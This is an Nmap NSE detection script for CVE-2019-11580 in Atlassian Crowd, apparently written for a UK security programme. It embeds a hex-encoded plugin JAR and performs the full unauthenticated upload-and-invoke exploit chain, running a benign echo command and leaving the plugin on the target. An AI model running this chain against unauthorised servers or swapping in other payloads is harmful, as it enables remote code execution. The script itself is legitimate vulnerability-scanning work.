--
-- Libraries
--
local http = require 'http'
local json = require 'json'
local shortport = require 'shortport'
local stdnse = require 'stdnse'
local vulns = require 'vulns'

--
-- Description
--
description = [[

Atlassian Crowd and Crowd Data Center had the pdkinstall development plugin incorrectly enabled in release builds. 
Attackers who can send unauthenticated or authenticated requests to a Crowd or Crowd Data Center instance can exploit this vulnerability to install arbitrary plugins, 
which permits remote code execution on systems running a vulnerable version of Crowd or Crowd Data Center.

We check for the presence of the vulnerability via:
 - Sending an unauthenticated POST request containing a basic plugin to the update plugin endpoint
 - If this is successful, a GET request is made to the installed plugin which will execute the command 'echo CVE-2019-11580' and return the result
 - This demonstrates that the server is vulnerable to remote code execution
This check is not intrusive, because:
 - Whilst it will install a plugin, the plugin does not permit remote code execution using arbitary commands. It will only execute 'echo CVE-2019-11580' when invoked and return the result
 - The plugin is however left behind
 - Does not transmit excessive network traffic
This check may have False Positives if:
 - No known false positive scenarios given this vulnerability
This check may have False Negatives if:
 - No known false negative scenarios given this vulnerability

**Please note, this script has been tested to identify the vulnerability against Atlassian Crowd 3.2.0 only**

How to use:
  nmap -sV --script crowd-vuln-cve-2019-11580 -p 8095 --script-args "url=/" <target>

References:
* https://nvd.nist.gov/vuln/detail/cve-2019-11580
* https://jira.atlassian.com/browse/CWD-5388
]]

--
-- Author
--
author = "Sowdagar Badesha at Riskaware for NCSC UK Industry 100"

--
-- License
---
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"

--
-- Categories
--
categories = {"intrusive", "vuln"}

--
-- The function for invoking the installed plugin
--
local function invoke_plugin(host, port, url_param, vuln)
    stdnse.debug1('Invoking the plugin')
    local plugin_url = url_param .. '/crowd/plugins/servlet/exp'
    local response = http.get(host, port, plugin_url)
    if response.status == 200 and string.match(response.body, "CVE[-]2019[-]11580") then
        vuln.state = vulns.STATE.VULN
        return vuln
    else
        stdnse.debug1('Web plugin invoke failed with response ', response)
    end
end
--
-- The checker function
--
local function check_vuln(vulnin, host, port)

    local vuln = vulnin

    -- https://nmap.org/nsedoc/lib/vulns.html
    vuln.state = vulns.STATE.NOT_VULN

    -- -- Get the base URL passed in as a parameter.
    local url_param = stdnse.get_script_args('url') or '/'
    local url_vuln = url_param .. '/crowd/admin/uploadplugin.action'

    -- -- Check url to upload plugin
    local response = http.get(host, port, url_vuln)

    -- -- Check if the request returned 200 response.
    if response.status ~= 400 then
        stdnse.debug1(
            'Plugin endpoint not found, is Atlassian Crowd installed? : /crowd/admin/uploadplugin.action ! "%s".',
            response.status)
        return vuln
    end

    -- -- Construct the url that the request is sent to
    local headers = {
        ['User-Agent'] = 'curl/7.29.0',
        ['Accept'] = '*/*',
        ['Content-Length'] = '5739',
        ['Expect'] = '100-continue',
        ['Content-Type'] = 'multipart/mixed; boundary=----------------------------f15fe87e95a7'
    }

    -- -- This is the plugin jar as hex, with header and footers for the multipart request
    local plugin_hex = '2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d6631356665383765393561370d0a436f6e74656e742d446973706f736974696f6e3a20666f726d2d646174613b206e616d653d2266696c655f63646c223b2066696c656e616d653d227263652e6a6172220d0a436f6e74656e742d547970653a206170706c69636174696f6e2f6f637465742d73747265616d0d0a0d0a504b030414000808080079507954000000000000000000000000090004004d4554412d494e462ffeca00000300504b0708000000000200000000000000504b030414000808080079507954000000000000000000000000140000004d4554412d494e462f4d414e49464553542e4d46f34dcccb4c4b2d2ed10d4b2d2acecccfb35230d433e0e5722e4a4d2c494dd175aa040a0045f40c4d14345c52933213f33479b978b900504b0708785960993600000037000000504b03041400080808002b8478540000000000000000000000001400000061746c61737369616e2d706c7567696e2e786d6c7d924d6ec3201085d78e943b20f698b46b8cd403e410533c8d50f9b1601cb5b72f0eb8a55655763c1e6fbe8750400e72b610c4e2d69b0dec1d3f276ea21fcdecc6aa8df8b17016c0e3c45f763fbb42801b26ceaa298b3ba66c6398f833676673fd99a3cf275696aa92b0e12d36a9ca90c0b7593f6c3310088381308992b900d957875c535a51c9c79d3e64c66c925da8d0e823b02f290d59c9ded8dd6f4df4d378192f4aeedb462e7fa39f4f83ca98ee0ea971979a2e5ae2f52dbf77ffbec9b025afc989d2adb40c5a9603257ba5997ae66490cde863c894605318106b7c59362a59a61dab0e6a3f7d3450f2f80f8afc05504b0708a6ab2576f10000001c020000504b03040a0000080000b942785400000000000000000000000004000000636f6d2f504b03040a00000800006748795400000000000000000000000008000000636f6d2f63646c2f504b03040a0000080000b94278540000000000000000000000000f000000636f6d2f63646c2f706c7567696e2f504b03041400080808003284785400000000000000000000000017000000636f6d2f63646c2f706c7567696e2f6578702e6a6176616d524d4fc240103d9784ff3072a115d980898986703244bd19307ae1b26e2774b5dd5db653c018febbb3b455301cb63b79f3de9b8fae93ea53ae10942d844a73e1f26aa5cda4dbe97674e1ac27f8901bb91325fa4d8e243222272e272759a1ad7832aea2057994c541ecaaf75c2b50b92c4bc09de34368d2f29cdd237f163500df411c35ea8dd529a4f601293ee2cc715d6149e0717d052778e9ac29911365128ca288fc571d44dc9a362b50450a53e8a1ca2cdcbfce86d7a3f1dd703cbeb91df526c73c5b11cf13a80dfee7143d7bab90a7729c9e5786748162c5e5eb304e04ee50c55c29a9a5d1d16e8231cb5c101cc1f1392a7adf5267de5bff8faa0d8162427f39ea37d036d339421c07980b09e6a77192c0c51486e3a4ed3fe2fd04d337af093df7bb0d01ab32e91350adfffe70ed41495219c4b39d4247da1afe93bf56cd9a06bca7a5e9c18073826cbdc3b6d183cf399bd60585633e4fcd4ff1c54b858d3208f7e139ec7f00504b0708691c69c369010000a5020000504b03041400080808006f50795400000000000000000000000018000000636f6d2f63646c2f706c7567696e2f6578702e636c6173738d54dd56db4610fed6d85e21144c4cd3c4f9a12125894943046943884da1c181406b7e6a53484eaf84bc07146cad2aad29798d5ef5ae975ce786b6b9e803f449fa0abd299db5e5839d901f1f797635fbcdcc37a3d9f9fbbfd77f017888e72686f09981eb06464ddcc0e75a8c99b8829b5adc327115b7079043dec438ee707c61620077b3643ca977531cf739be6448cf7abea7e618faf2e35b0cc992ac09864cd9f3c55ab3b123c24d67a74e9a544d3e158aa1922fbf700e9c433b12e1415d287b4fa9c05e26516d2b2ae2a7a68854f183b028907e248a3aeab9aa72dcfd55276805e3f88ae301c734c7438e1906b32a9ba12b963c4dc41087c13deddbc27964198685bb27af97b61627ee4f4e3d9a989a7a3033c9008e47160a285a98c5d716e6306fe11b2d1e63c142094f38162d2ce12979d0deecbae3efda8b87ae0894277d0bcb5861185a9052452a748255a1f6642dcaa4f1ad81ef2c94b16a614d13c8bab261bbb5ba1dd49bbb9e6f133f8691f767cf70f3a3aac870ebe3ca48544fb3a8aad0f37719ce9faa3642e98a28ea24eb497bc50f9a8a90c269f4202b4d5f790d7268ee92fbcecb85fc78f92d4c91fa451c0a97e176befc66f862b7411c9e0c06c96b4fe88b1dcfbd9c62e86218cab0034dd2526b752a7d9a7e3add0e3d25c25e1f1b143c3e2876a5dba5a666fe596fc8617e45b79fa164a7649ff4e4196762621d1b1497998c62359c7d5192beeba86d4fedd12e528eafa8b4336714e1fd65895574df024daf750b3643c7a52bf0bd6eb11f18c64ed19e7f20f7456cd466b0e4b84a862f39b6e92697a5dc6f52ef592bbe2fc252dd892241b47eeda615fb6877f3b2e3d7ea221a6b1b9ec1f55d869b2f037106fcc72ed5face0be1aa9e6c631725a75eaf52f98b1ccfe27bf0416ef1857a370ea3c8d044d4bf04989e0c2487e9ed1aad340e90baf33bd82bdad03726996e29b5bc804fdb509620d37ed23ecb26d6b27d85e41f484e1c235548e552c74817d27ae105de376de4d2c7309e4f1b89df90bdfb27fac98bf1cb31cca3937f8e304c06498db55ee31c50481ec158234783afc83fa771344ff317d452155a132d3673441e30d1471a4e464318c445d28dd06e949299a0746689e73ca11f13e3751aec1542547109dbb84c3be009d22704eee7c8705ce2c8715c6e3d5738aed243f99e1034f5c639b0c031f02f327a4912836bad128e60b3c588063eb6284e8e380006bddfa3bffd3f504b0708493dbc7e7903000088060000504b01021400140008080800795079540000000002000000000000000900040000000000000000000000000000004d4554412d494e462ffeca0000504b010214001400080808007950795478596099360000003700000014000000000000000000000000003d0000004d4554412d494e462f4d414e49464553542e4d46504b010214001400080808002b847854a6ab2576f10000001c0200001400000000000000000000000000b500000061746c61737369616e2d706c7567696e2e786d6c504b01020a000a0000080000b94278540000000000000000000000000400000000000000000000000000e8010000636f6d2f504b01020a000a00000800006748795400000000000000000000000008000000000000000000000000000a020000636f6d2f63646c2f504b01020a000a0000080000b94278540000000000000000000000000f0000000000000000000000000030020000636f6d2f63646c2f706c7567696e2f504b0102140014000808080032847854691c69c369010000a502000017000000000000000000000000005d020000636f6d2f63646c2f706c7567696e2f6578702e6a617661504b010214001400080808006f507954493dbc7e790300008806000018000000000000000000000000000b040000636f6d2f63646c2f706c7567696e2f6578702e636c617373504b05060000000008000800ef010000ca07000000000d0a2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d6631356665383765393561372d2d0d0a'
    local data = stdnse.fromhex(plugin_hex)

    -- -- Make the POST request to the form API.
    stdnse.debug1('Testing plugin install : %s', url_vuln)
    local response = http.post(host, port, url_vuln, {
        header = headers
    }, {}, data)

    -- -- Check if the request returned 200 response.
    if response.status == 200 then
        stdnse.debug1('Plugin installed successfully')
        return invoke_plugin(host, port, url_param, vuln)
    else
        stdnse.debug1('Plugin failed to install with the status "%s".', response.status)
        return vuln
    end
end

--
-- NMAP portrule function
--
portrule = shortport.http

--
-- NMAP action function
--
action = function(host, port)
    -- Definition of the vulnerability
    local vuln = {
        title = 'Atlassian Crowd arbitrary plugin installation vulnerability resulting in possible remote code execution',
        IDS = {
            CVE = 'CVE-2019-11580'
        },
        risk_factor = 'HIGH',
        scores = {
            CVSSv3 = '9.8 (CRITICAL) (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)'
        },
        description = [[
          Attackers who can send unauthenticated or authenticated requests to a Crowd or Crowd Data Center instance can exploit this vulnerability to install arbitrary plugins,
          which permits remote code execution on systems running a vulnerable version of Crowd or Crowd Data Center. 
        ]],
        references = {'https://nvd.nist.gov/vuln/detail/cve-2019-11580', 'https://jira.atlassian.com/browse/CWD-5388'},
        dates = {
            disclosure = {
                year = '2019',
                month = '06',
                day = '03'
            }
        }
    }

    -- Build the report skeleton
    local report = vulns.Report:new(SCRIPT_NAME, host, port)

    -- Check if vulnerable
    local status, err = check_vuln(vuln, host, port)
    if not status then
        return nil
    end

    -- Return it
    return report:make_output(vuln)
end
